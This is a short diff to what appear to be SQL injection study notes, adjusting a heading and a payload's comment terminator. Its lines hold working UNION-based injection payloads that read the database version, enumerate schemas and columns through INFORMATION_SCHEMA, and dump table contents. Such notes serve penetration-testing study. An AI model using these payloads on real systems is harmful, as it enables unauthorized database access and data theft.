@@ -112,7 +112,7 @@ Or we can use `@@version` and cycle through our available columns to see which o
 test') union select 1,@@version,3,4-- -
 ```
 
-### Getting the Database Layout.
+### Getting the Database Layout to locate and extract the data.
 Finding all of the DB's
 ```sql
 cn' UNION select 1, schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- 
@@ -132,5 +132,5 @@ cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.C
 
 Getting the Data
 ```sql
-test') UNION select 1,2,<column1,column2 from <dbname.table>
+test') UNION select 1,2,<column1,column2 from <dbname.table>-- 
 ```
